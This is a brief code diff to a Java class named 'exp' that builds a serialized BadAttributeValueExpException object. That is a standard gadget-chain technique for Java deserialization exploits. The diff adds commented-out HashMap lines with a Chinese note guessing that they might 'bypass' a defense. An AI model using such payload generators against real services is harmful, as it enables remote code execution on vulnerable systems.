@@ -31,6 +31,11 @@ public class exp {
         Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
         val.setAccessible(true);
         val.set(exp,jo);
+
+//        加上后好像能bypass，不太清楚
+//        HashMap<Object, Object> map = new HashMap<>();
+//        map.put(templates,badAttributeValueExpException);
+        
         System.out.println(serial(exp));
 
     }
